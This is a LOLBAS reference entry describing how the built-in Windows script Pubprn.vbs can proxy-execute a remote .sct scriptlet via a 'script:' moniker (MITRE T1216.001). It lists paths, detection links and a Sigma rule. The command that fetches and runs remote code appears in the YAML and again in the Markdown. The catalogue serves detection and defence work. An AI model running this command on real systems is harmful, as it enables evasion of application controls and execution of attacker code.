---
Acknowledgement:
- Person: Matt Nel
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
Commands:
- Category: Execute
  Command: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
  Description: Set the 2nd variable with a Script COM moniker to perform Windows Script
    Host (WSH) Injection
  MitreID: T1216.001
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: SCT
  Usecase: Proxy execution
Created: 2018-05-25
Description: Proxy execution with Pubprn.vbs
Detection:
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
Full_Path:
- Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
- Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Name: Pubprn.vbs
Resources:
- Link: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
- Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- Link: https://github.com/enigma0x3/windows-operating-system-archaeology
mitre_data:
  technique_ids:
  - T1216.001
tags:
- lolbas/osscripts
---

# Pubprn.vbs

Proxy execution with Pubprn.vbs

# Path(s)

- `C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs`
- `C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs`

# Execute Commands

Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection

```batch
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
```

- **Usecase:** Proxy execution
- **Privileges Required:** User
- **MitreID:** `T1216.001`
- **Operating System(s):** Windows 10



# Resource(s)

- https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
- https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- https://github.com/enigma0x3/windows-operating-system-archaeology
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Matt Nel